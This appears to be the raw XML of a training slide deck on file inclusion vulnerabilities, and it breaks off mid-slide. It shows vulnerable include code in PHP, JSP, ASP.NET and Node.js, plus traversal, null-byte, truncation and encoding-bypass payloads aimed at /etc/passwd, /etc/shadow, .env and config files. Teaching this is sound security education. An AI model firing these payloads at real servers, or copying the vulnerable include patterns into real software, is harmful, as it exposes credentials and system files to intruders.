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4630400" cy="8229600"/>
  <p:notesSz cx="8229600" cy="146304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Roboto Condensed" panose="02000000000000000000" pitchFamily="2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8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44604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FILE INCLUSION VULNERABILITIES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8188"/>
            <a:ext cx="87314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1. WHAT IS FILE INCLUSION?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53769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DEFINITION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44482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File Inclusion is a web vulnerability that allows attackers to </a:t>
            </a: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include files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on a web server through the web browser. This occurs when an application uses user-supplied input to construct file paths without proper validation.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257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Concept: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043839"/>
            <a:ext cx="6521410" cy="907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517790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User Input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043839"/>
            <a:ext cx="6521410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2014" y="517790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File Path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767626"/>
            <a:ext cx="6521410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0604" y="690169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Server Includes File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767626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690169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Code Execution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0879"/>
            <a:ext cx="922305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WHY FILE INCLUSION IS DANGEROUS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3414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File inclusion vulnerabilities can lead to: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59537"/>
            <a:ext cx="4196358" cy="2024182"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 168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18635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REMOTE CODE EXECUTION (RCE)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03109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Execute arbitrary code on the server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959537"/>
            <a:ext cx="4196358" cy="2024182"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 168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318635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SENSITIVE DATA EXPOSURE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403109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Read configuration files, passwords, source code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959537"/>
            <a:ext cx="4196358" cy="2024182"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 168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3186351"/>
            <a:ext cx="34387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SERVER COMPROMISE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367676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Full system takeover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238869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0604" y="5465683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PRIVILEGE ESCALATION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0604" y="631043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Gain administrative access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216962" y="5238869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43776" y="5465683"/>
            <a:ext cx="3567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WEBSITE DEFACEMENT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3776" y="595610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Modify website content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640133" y="5238869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866948" y="54656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THEFT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66948" y="595610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Access database credentials and user data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0293" y="1542336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ATTACK SURFACE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440293" y="1961555"/>
            <a:ext cx="8263414" cy="4725591"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 399"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="434102" y="1961555"/>
            <a:ext cx="8275796" cy="4725591"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 399"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="559832" y="2055852"/>
            <a:ext cx="8024336" cy="4536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┌─────────────────────────────────────────────────────┐
│ File Inclusion Attack Flow │
├─────────────────────────────────────────────────────┤
│ │
│ ┌──────────────┐ ┌──────────────┐ │
│ │ Attacker │─────&gt;│ Vulnerable │ │
│ │ │ │ Application │ │
│ └──────────────┘ └──────┬───────┘ │
│ │ │
│ │ │
│ Malicious Input │
│ │ │
│ ▼ │
│ ┌──────────────┐ │
│ │ File System │ │
│ │ Access │ │
│ └──────┬───────┘ │
│ │ │
│ │ │
│ ▼ │
│ ┌──────────────┐ │
│ │ Sensitive │ │
│ │ Files │ │
│ │ /etc/passwd │ │
│ │ config.php │ │
│ │ shell.php │ │
│ └──────────────┘ │
└─────────────────────────────────────────────────────┘
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741"/>
            <a:ext cx="8790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2. TYPES OF FILE INCLUSION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77246"/>
            <a:ext cx="506170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COMPARISON TABLE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2684383"/>
            <a:ext cx="13042821" cy="4567476"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7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692003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9653" y="283571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Feature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5077" y="2835712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Local File Inclusion (LFI)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16691" y="283571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Remote File Inclusion (RFI)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342322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9653" y="348603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File Location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5077" y="348603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Server's local file system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16691" y="348603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External/remote servers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3992642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9653" y="413635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Severity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375077" y="4136350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High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16691" y="413635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Critical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642961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9653" y="478667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Prerequisites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375077" y="4786670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Vulnerable include function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716691" y="478667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allow_url_include=On (PHP)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293281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9653" y="543698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Common Targets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375077" y="543698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Config files, logs, /etc/passwd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716691" y="543698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Malicious PHP shells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5943600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9653" y="608730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Exploitation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5375077" y="608730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Read sensitive files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716691" y="608730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Execute remote code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801410" y="6593919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29653" y="673762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Detection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5375077" y="673762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Easier to detect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9716691" y="673762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Harder to detect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049" y="644604"/>
            <a:ext cx="9451062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3. HOW FILE INCLUSION WORKS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1049" y="1418511"/>
            <a:ext cx="4731306" cy="55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BASIC MECHANISM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71049" y="2054781"/>
            <a:ext cx="6142792" cy="412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NORMAL APPLICATION BEHAVIOR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1049" y="2788563"/>
            <a:ext cx="13088303" cy="2414111"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1369"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="760095" y="2788563"/>
            <a:ext cx="13110210" cy="2414111"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1369"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="980361" y="2953702"/>
            <a:ext cx="12669679" cy="208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
// page.php - Normal usage
$page = $_GET['page'];
include($page . '.php');
?&gt;
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1049" y="5443299"/>
            <a:ext cx="13088303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Intended Usage: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1049" y="6031230"/>
            <a:ext cx="13088303" cy="36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https://example.com/page.php?page=home</a:t>
            </a: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Includes: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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home.php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1049" y="6634401"/>
            <a:ext cx="13088303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Malicious Usage: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1049" y="7222331"/>
            <a:ext cx="13088303" cy="36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https://example.com/page.php?page=../../../../etc/passwd</a:t>
            </a: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Includes: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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../../../../etc/passwd.php</a:t>
            </a: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(attempts to read system files)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914" y="1110615"/>
            <a:ext cx="7193637" cy="469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COMMON VULNERABLE FUNCTIONS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833914" y="1969175"/>
            <a:ext cx="281785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PHP FUNCTIONS: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33914" y="2496383"/>
            <a:ext cx="6252210" cy="2479119"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1137"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="824627" y="2496383"/>
            <a:ext cx="6270784" cy="2479119"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1137"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1012388" y="2637234"/>
            <a:ext cx="5895261" cy="219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include()           // Includes and evaluates file
include_once()      // Includes file only once
require()           // Includes file (fatal error if fails)
require_once()      // Requires file only once
file_get_contents() // Reads file into string
fopen()             // Opens file
readfile()          // Reads and outputs file
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51896" y="1969175"/>
            <a:ext cx="301787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OTHER LANGUAGES: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51896" y="2476857"/>
            <a:ext cx="625221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JSP (Java):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551896" y="2926556"/>
            <a:ext cx="6252210" cy="831056"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3391"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7542609" y="2926556"/>
            <a:ext cx="6270784" cy="831056"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3391"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7730371" y="3067407"/>
            <a:ext cx="5895261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&lt;jsp:include page="&lt;%= request.getParameter('page') %&gt;" /&gt;
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51896" y="3932634"/>
            <a:ext cx="625221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ASP.NET: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551896" y="4382333"/>
            <a:ext cx="6252210" cy="831056"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3391"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7542609" y="4382333"/>
            <a:ext cx="6270784" cy="831056"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3391"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7730371" y="4523184"/>
            <a:ext cx="5895261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&lt;!--#include file="&lt;%= Request.QueryString("page") %&gt;"--&gt;
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51896" y="5388412"/>
            <a:ext cx="625221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Node.js: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551896" y="5838111"/>
            <a:ext cx="6252210" cy="1105733"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2548"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD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42609" y="5838111"/>
            <a:ext cx="6270784" cy="1105733"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2548"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7730371" y="5978962"/>
            <a:ext cx="5895261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 page = req.query.page;
require(page);
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635" y="885944"/>
            <a:ext cx="8364974" cy="62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4. LOCAL FILE INCLUSION (LFI)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01635" y="1583174"/>
            <a:ext cx="4609386" cy="501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4.1 BASIC LFI ATTACK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01635" y="2155031"/>
            <a:ext cx="4797266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VULNERABLE CODE EXAMPLE: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701635" y="2796659"/>
            <a:ext cx="13227129" cy="2112883"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1423"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="691634" y="2796659"/>
            <a:ext cx="13247132" cy="2112883"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1423"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="892016" y="2946916"/>
            <a:ext cx="12846368" cy="1812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
// index.php
$file = $_GET['file'];
include('/var/www/html/pages/' . $file);
?&gt;
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1635" y="5175290"/>
            <a:ext cx="3027759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NORMAL REQUEST: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701635" y="5816918"/>
            <a:ext cx="13227129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https://example.com/index.php?file=about.php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Includes: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="15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/var/www/html/pages/about.php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01635" y="6392347"/>
            <a:ext cx="3007043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ATTACK REQUEST:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="701635" y="7033974"/>
            <a:ext cx="13227129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https://example.com/index.php?file=../../../../etc/passwd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Includes: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="15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/var/www/html/pages/../../../../etc/passwd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Resolves to: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="15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/etc/passwd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6875" y="3214926"/>
            <a:ext cx="9064704" cy="51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4.2 DIRECTORY TRAVERSAL TECHNIQUES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16875" y="3800951"/>
            <a:ext cx="5420558" cy="384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TECHNIQUE 1: BASIC TRAVERSAL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16875" y="4462463"/>
            <a:ext cx="13196649" cy="3112532"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 987"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="706636" y="4462463"/>
            <a:ext cx="13217128" cy="3112532"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 987"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="911423" y="4616053"/>
            <a:ext cx="12807553" cy="280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Linux/Unix
?file=../../../../etc/passwd
?file=../../../../etc/shadow
?file=../../../../var/log/apache2/access.log
 Windows
?file=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
?file=..\\..\\..\\..\\windows\\win.ini
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D404FF-A67C-6839-90CE-D44C44C12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1125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423"/>
            <a:ext cx="893909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TECHNIQUE 2: NULL BYTE INJECTION (PHP &lt; 5.3.4)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1597343"/>
            <a:ext cx="13042821" cy="4694873"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 725"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="782479" y="1597343"/>
            <a:ext cx="13065443" cy="4694873"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 725"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009293" y="1767364"/>
            <a:ext cx="12611814" cy="435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Bypass file extension check
?file=../../../../etc/passwd%00
 If code appends .php:
include($file . '.php');
 Attack:
?file=../../../../etc/passwd%00
 Result: /etc/passwd
(null byte terminates string, .php is ignored)
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6547366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DBDBD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891457"/>
            <a:ext cx="283488" cy="2268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0906" y="6830854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Note:</a:t>
            </a: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Null byte injection only works in PHP versions prior to 5.3.4. Modern PHP versions have patched this vulnerability.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823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TECHNIQUE 3: PATH TRUNCATION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40091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Advanced file inclusion exploitation techniques for security testing and penetration analysis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7835"/>
            <a:ext cx="102260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TECHNIQUE 3: PATH TRUNCATION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9024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Exploit maximum path length (4096 bytes on Linux)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598902"/>
            <a:ext cx="13042821" cy="702945"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4840"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6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3598902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DBDBD6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3768923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?file=../../../../etc/passwd/./././././././.[repeat]././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5569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path gets truncated, removing the appended extension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175052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DBDBD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519142"/>
            <a:ext cx="283488" cy="226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0906" y="5458539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Concept:</a:t>
            </a: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By exceeding the maximum path length, the system truncates the path, effectively removing any security extensions that were appended to prevent directory traversal attacks.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8581"/>
            <a:ext cx="103104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TECHNIQUE 4: ENCODING BYPASS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40988"/>
            <a:ext cx="4196358" cy="2491859"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1365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678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URL ENCODING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20604" y="3977283"/>
            <a:ext cx="3742730" cy="1428750"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2381"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009293" y="3977283"/>
            <a:ext cx="3765352" cy="1428750"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2381"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1236107" y="4147304"/>
            <a:ext cx="331172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?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd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140988"/>
            <a:ext cx="4196358" cy="2491859"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1365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43776" y="3367802"/>
            <a:ext cx="36195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DOUBLE URL ENCODING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43776" y="3977283"/>
            <a:ext cx="3742730" cy="1428750"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2381"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5432465" y="3977283"/>
            <a:ext cx="3765352" cy="1428750"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2381"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5659279" y="4147304"/>
            <a:ext cx="331172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?file=..%252F..%252F..%252F..%252Fetc%252Fpasswd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140988"/>
            <a:ext cx="4196358" cy="2491859"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1365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866948" y="33678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UTF-8 ENCODING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866948" y="3977283"/>
            <a:ext cx="3742730" cy="1428750"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2381"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9855637" y="3977283"/>
            <a:ext cx="3765352" cy="1428750"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2381"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDB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82451" y="4147304"/>
            <a:ext cx="331172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?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd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58879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These encoding techniques bypass input validation filters by obfuscating the directory traversal sequences.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1763" y="909995"/>
            <a:ext cx="5952173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4.3 COMMON TARGET FILES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21763" y="1462921"/>
            <a:ext cx="4071104" cy="40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LINUX/UNIX SYSTEMS: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721763" y="2157651"/>
            <a:ext cx="2026563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SYSTEM FILES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721763" y="2541151"/>
            <a:ext cx="5395555" cy="1577578"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1542"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1713667" y="2541151"/>
            <a:ext cx="5411748" cy="1577578"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1542"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1875711" y="2662714"/>
            <a:ext cx="5087660" cy="133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/etc/passwd # User accounts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/etc/shadow # Password hashes (requires root)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/etc/group # User groups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/etc/hosts # Host file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/etc/issue # OS version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/etc/motd # Message of the day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721763" y="4248983"/>
            <a:ext cx="2615922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CONFIGURATION FILES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721763" y="4632484"/>
            <a:ext cx="5395555" cy="1132761"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2147"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1713667" y="4632484"/>
            <a:ext cx="5411748" cy="1132761"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2147"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1875711" y="4754047"/>
            <a:ext cx="5087660" cy="889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/etc/apache2/apache2.conf # Apache config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/etc/nginx/nginx.conf # Nginx config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/etc/mysql/my.cnf # MySQL config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/etc/php/php.ini # PHP config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721763" y="5895499"/>
            <a:ext cx="2256592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APPLICATION FILES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721763" y="6278999"/>
            <a:ext cx="5395555" cy="910352"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2671"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1713667" y="6278999"/>
            <a:ext cx="5411748" cy="910352"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2671"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1875711" y="6400562"/>
            <a:ext cx="5087660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/var/www/html/config.php # Web app config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/var/www/html/.env # Environment variables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/var/www/html/wp-config.php # WordPress config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20464" y="2157651"/>
            <a:ext cx="2026563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LOG FILES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20464" y="2541151"/>
            <a:ext cx="5395555" cy="1132761"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2147"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD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12367" y="2541151"/>
            <a:ext cx="5411748" cy="1132761"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2147"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7674412" y="2662714"/>
            <a:ext cx="5087660" cy="889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/var/log/apache2/access.log # Apache access logs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/var/log/apache2/error.log # Apache error logs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/var/log/nginx/access.log # Nginx access logs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/var/log/auth.log # Authentication logs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20464" y="3804166"/>
            <a:ext cx="2026563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SSH KEYS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20464" y="4187666"/>
            <a:ext cx="5395555" cy="910352"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2671"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBDBD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7512367" y="4187666"/>
            <a:ext cx="5411748" cy="910352"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2671"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
